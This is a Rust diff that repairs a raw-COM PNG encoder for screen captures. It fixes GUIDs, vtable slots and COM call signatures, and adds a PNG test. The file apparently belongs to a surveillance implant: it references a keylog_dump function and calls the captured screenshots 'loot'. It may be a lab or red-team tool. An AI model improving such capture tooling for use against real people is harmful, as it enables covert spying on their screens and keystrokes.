@@ -206,21 +206,22 @@ fn bmp_bytes(capture: &Capture) -> Vec<u8> {
 
 // --- PNG through WIC (raw COM) ---
 
-/// GUIDs (mixed-endian DWORD/WORD layout).
+/// GUIDs in x64 COM layout (first DWORD/WORD/WORD little-endian,
+/// remainder as-is). Values verified against the Windows SDK headers
+/// (INITGUID materialization) and the interface registry — a GUID
+/// hex-dumped from its string form without the field swaps silently
+/// registers as CLASSNOTREG.
 const CLSID_WICIMAGING_FACTORY: [u8; 16] = [
-    0xc5, 0xf5, 0x7c, 0xca, 0x7e, 0x1d, 0xf0, 0x4b, 0xab, 0x61, 0x29, 0x25, 0x6e, 0x9c, 0x41, 0xc8,
+    0xe8, 0x06, 0x7d, 0x31, 0x24, 0x5f, 0x3d, 0x43, 0xbd, 0xf7, 0x79, 0xce, 0x68, 0xd8, 0xab, 0xc2,
 ];
 const IID_IWICIMAGING_FACTORY: [u8; 16] = [
-    0xec, 0x5e, 0xc8, 0xac, 0xaa, 0x1a, 0x0d, 0x45, 0xb4, 0x2f, 0x74, 0xfc, 0x1a, 0xc3, 0x7a, 0x33,
+    0xa9, 0xc8, 0x5e, 0xec, 0x95, 0xc3, 0x14, 0x43, 0x9c, 0x77, 0x54, 0xd7, 0xa9, 0x35, 0xff, 0x70,
 ];
 const GUID_CONTAINER_FORMAT_PNG: [u8; 16] = [
-    0x67, 0xa3, 0x62, 0x1f, 0x3c, 0x57, 0xc1, 0x47, 0xa8, 0xef, 0xed, 0xf1, 0x59, 0x85, 0xc5, 0x1a,
+    0xf4, 0xfa, 0x7c, 0x1b, 0x3f, 0x71, 0x3c, 0x47, 0xbb, 0xcd, 0x61, 0x37, 0x42, 0x5f, 0xae, 0xaf,
 ];
 const GUID_WICPIXELFORMAT_32BPPBGRA: [u8; 16] = [
-    0x7e, 0xe8, 0x84, 0x6f, 0x47, 0xda, 0x99, 0x4a, 0xa0, 0xc4, 0x8a, 0x08, 0x03, 0xaa, 0x8b, 0xa2,
-];
-const IID_ISTREAM: [u8; 16] = [
-    0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
+    0x24, 0xc3, 0xdd, 0x6f, 0x03, 0x4e, 0xfe, 0x4b, 0xb1, 0x85, 0x3d, 0x77, 0x76, 0x8d, 0xc9, 0x0f,
 ];
 
 type VtblCall4 = unsafe extern "system" fn(usize, usize, usize, usize, usize) -> i32;
@@ -239,24 +240,44 @@ fn hr_failed(hr: i32) -> bool {
 }
 
 fn png_encode(capture: &Capture) -> Option<Vec<u8>> {
+    // Lab-side breadcrumb: set ABRAHAM_WIC_DEBUG=1 to trace each hr.
+    let trace = std::env::var_os("ABRAHAM_WIC_DEBUG").is_some();
     unsafe {
         let co_init: unsafe extern "system" fn(*mut usize, u32) -> i32 =
             std::mem::transmute(ole32("CoInitializeEx")?);
-        let co_create: unsafe extern "system" fn(*const u8, usize, *const u8, *mut usize) -> i32 =
-            std::mem::transmute(ole32("CoCreateInstance")?);
+        // CoCreateInstance takes FIVE parameters — rclsid, pUnkOuter,
+        // dwClsContext, riid, ppv. The pUnkOuter NULL is not optional
+        // padding: without it every argument shifts left and the class
+        // context lands in pUnkOuter, which is aggregation and earns
+        // E_INVALIDARG before any GUID is even consulted.
+        let co_create: unsafe extern "system" fn(
+            *const u8,
+            usize,
+            usize,
+            *const u8,
+            *mut usize,
+        ) -> i32 = std::mem::transmute(ole32("CoCreateInstance")?);
         let co_uninit: unsafe extern "system" fn() = std::mem::transmute(ole32("CoUninitialize")?);
 
         let hr = co_init(std::ptr::null_mut(), 0x2); // COINIT_APARTMENTTHREADED
-        let need_uninit = hr >= 0 || hr as u32 == 0x8001_0106; // RPC_E_CHANGED_MODE
+                                                     // Only tear down an apartment this call created. RPC_E_CHANGED_MODE
+                                                     // means the thread was already initialized by someone else; a
+                                                     // matching CoUninitialize would decrement THEIR balance and rip
+                                                     // COM out from under them mid-flight.
+        let need_uninit = hr >= 0;
         let result = (|| -> Option<Vec<u8>> {
             let mut factory = 0usize;
             let hr = co_create(
                 CLSID_WICIMAGING_FACTORY.as_ptr(),
+                0, // pUnkOuter: no aggregation
                 1, // CLSCTX_INPROC_SERVER
                 IID_IWICIMAGING_FACTORY.as_ptr(),
                 &mut factory,
             );
             if hr_failed(hr) || factory == 0 {
+                if trace {
+                    eprintln!("[wic] co_create factory: {hr:#x}");
+                }
                 return None;
             }
             let release = |obj: usize| {
@@ -264,42 +285,55 @@ fn png_encode(capture: &Capture) -> Option<Vec<u8>> {
             };
             // IWICImagingFactory::CreateStream = slot 14.
             let mut stream = 0usize;
-            if hr_failed(com(
-                factory,
-                14,
-                &mut stream as *mut usize as usize,
-                0,
-                0,
-                0,
-            )) {
+            let hr = com(factory, 14, &mut stream as *mut usize as usize, 0, 0, 0);
+            if trace {
+                eprintln!("[wic] CreateStream: {hr:#x}");
+            }
+            if hr_failed(hr) || stream == 0 {
                 release(factory);
                 return None;
             }
             // Buffer generous; the encoder writes far less than raw BGRA.
             let mut buffer = vec![0u8; capture.bgra.len() / 2 + 4096];
-            // IWICStream::InitializeFromMemory = slot 5.
-            let init_hr = com(stream, 5, buffer.as_mut_ptr() as usize, buffer.len(), 0, 0);
+            // IWICStream::InitializeFromMemory = slot 16. IWICStream
+            // slots start AFTER the eleven inherited ISequentialStream/
+            // IStream entries (Read 3 .. Clone 13, InitializeFromIStream
+            // 14, InitializeFromFilename 15).
+            let init_hr = com(stream, 16, buffer.as_mut_ptr() as usize, buffer.len(), 0, 0);
+            if trace {
+                eprintln!("[wic] InitializeFromMemory: {init_hr:#x}");
+            }
             if hr_failed(init_hr) {
                 release(stream);
                 release(factory);
                 return None;
             }
-            // CreateEncoder = slot 8.
+            // CreateEncoder = slot 8: (guidContainerFormat&, pVendor=NULL, &encoder).
             let mut encoder = 0usize;
-            if hr_failed(com(
+            let hr = com(
                 factory,
                 8,
                 GUID_CONTAINER_FORMAT_PNG.as_ptr() as usize,
+                0,
                 &mut encoder as *mut usize as usize,
                 0,
-                0,
-            )) {
+            );
+            if trace {
+                eprintln!("[wic] CreateEncoder: {hr:#x}");
+            }
+            if hr_failed(hr) || encoder == 0 {
                 release(stream);
                 release(factory);
                 return None;
             }
-            // IWICBitmapEncoder::Initialize(stream, WICBitmapEncoderNoCache) = slot 3.
-            if hr_failed(com(encoder, 3, stream, 0, 0, 0)) {
+            // IWICBitmapEncoder::Initialize(stream, cacheOption) = slot 3.
+            // WICBitmapEncoderNoCache = 0x2: the PNG encoder rejects the
+            // CacheInMemory default (WINCODEC_ERR_UNSUPPORTEDOPERATION).
+            let hr = com(encoder, 3, stream, 0x2, 0, 0);
+            if trace {
+                eprintln!("[wic] EncoderInitialize: {hr:#x}");
+            }
+            if hr_failed(hr) {
                 release(encoder);
                 release(stream);
                 release(factory);
@@ -307,57 +341,62 @@ fn png_encode(capture: &Capture) -> Option<Vec<u8>> {
             }
             // CreateNewFrame(&frame, NULL) = slot 10.
             let mut frame = 0usize;
-            if hr_failed(com(encoder, 10, &mut frame as *mut usize as usize, 0, 0, 0)) {
+            let hr = com(encoder, 10, &mut frame as *mut usize as usize, 0, 0, 0);
+            if trace {
+                eprintln!("[wic] CreateNewFrame: {hr:#x}");
+            }
+            if hr_failed(hr) || frame == 0 {
                 release(encoder);
                 release(stream);
                 release(factory);
                 return None;
             }
-            let mut ok = !hr_failed(com(frame, 3, 0, 0, 0, 0)); // Initialize(NULL)
-                                                                // SetSize = slot 5.
-            ok = ok && !hr_failed(com(frame, 5, capture.width, capture.height, 0, 0));
-            // SetPixelFormat(&guid) = slot 7 (in/out).
+            let frame_init_hr = com(frame, 3, 0, 0, 0, 0); // Initialize(NULL)
+            if trace {
+                eprintln!("[wic] FrameInitialize: {frame_init_hr:#x}");
+            }
+            let mut ok = !hr_failed(frame_init_hr);
+            // SetSize = slot 4.
+            ok = ok && !hr_failed(com(frame, 4, capture.width, capture.height, 0, 0));
+            // SetPixelFormat(&guid) = slot 6 (in/out).
             let mut pixel_format = GUID_WICPIXELFORMAT_32BPPBGRA;
-            ok = ok && !hr_failed(com(frame, 7, pixel_format.as_mut_ptr() as usize, 0, 0, 0));
-            // WritePixels(lines, stride, size, data) = slot 13.
+            ok = ok && !hr_failed(com(frame, 6, pixel_format.as_mut_ptr() as usize, 0, 0, 0));
+            // WritePixels(lines, stride, size, data) = slot 10.
             let stride = capture.width * 4;
             ok = ok
                 && !hr_failed(com(
                     frame,
-                    13,
+                    10,
                     capture.height,
                     stride,
                     capture.bgra.len(),
                     capture.bgra.as_ptr() as usize,
                 ));
-            // Frame Commit = slot 15.
-            ok = ok && !hr_failed(com(frame, 15, 0, 0, 0, 0));
+            // Frame Commit = slot 12.
+            ok = ok && !hr_failed(com(frame, 12, 0, 0, 0, 0));
             // Encoder Commit = slot 11.
             ok = ok && !hr_failed(com(encoder, 11, 0, 0, 0, 0));
+            if trace {
+                eprintln!("[wic] encode tail ok={ok}");
+            }
             let mut out = None;
             if ok {
-                // IStream::Stat(&statstg, STATFLAG_NONAME=1) = slot 12;
-                // cbSize sits at offset 16 of the x64 STATSTG.
-                let mut istream = 0usize;
-                if com(
-                    stream,
-                    0, // QueryInterface
-                    IID_ISTREAM.as_ptr() as usize,
-                    &mut istream as *mut usize as usize,
-                    0,
-                    0,
-                ) >= 0
-                    && istream != 0
-                {
-                    let mut stat = [0u8; 96];
-                    if com(istream, 12, stat.as_mut_ptr() as usize, 1, 0, 0) >= 0 {
-                        let size = usize::from_le_bytes(stat[16..24].try_into().unwrap());
-                        if size > 0 && size <= buffer.len() && buffer[0..8] == *b"\x89PNG\r\n\x1a\n"
-                        {
-                            out = Some(buffer[..size].to_vec());
-                        }
+                // IStream::Seek(0, STREAM_SEEK_CUR, &pos) = slot 5: the
+                // write cursor after Commit is exactly the encoded size.
+                // Stat would report the memory buffer's CAPACITY, shipping
+                // capacity-sized loot trailing zeros.
+                let mut pos: u64 = 0;
+                let hr = com(stream, 5, 0, 1, &mut pos as *mut u64 as usize, 0);
+                if trace {
+                    eprintln!("[wic] Seek CUR: {hr:#x} pos={pos}");
+                }
+                if hr >= 0 {
+                    let size = pos as usize;
+                    if size > 0 && size <= buffer.len() && buffer[0..8] == *b"\x89PNG\r\n\x1a\n" {
+                        out = Some(buffer[..size].to_vec());
+                    } else if trace {
+                        eprintln!("[wic] readback rejected size={size}");
                     }
-                    release(istream);
                 }
             }
             release(frame);
@@ -512,6 +551,25 @@ fn keylog_dump() -> Result<Vec<u8>, String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// png_encode must produce a real PNG (magic + compression) — the
+    /// WIC slot/GUID table here is the corrected one; the original
+    /// always fell through to the BMP fallback silently.
+    #[test]
+    fn png_encode_returns_png() {
+        let capture = Capture {
+            width: 64,
+            height: 64,
+            bgra: vec![0x80; 64 * 64 * 4],
+        };
+        let png = png_encode(&capture).expect("png_encode failed");
+        assert!(
+            png.starts_with(&[0x89, b'P', b'N', b'G', 0x0d, 0x0a, 0x1a, 0x0a]),
+            "not a PNG: {} bytes",
+            png.len()
+        );
+        assert!(png.len() < 64 * 64 * 4 / 2, "PNG should compress");
+    }
 
     #[test]
     fn screenshot_returns_png_or_bmp() {
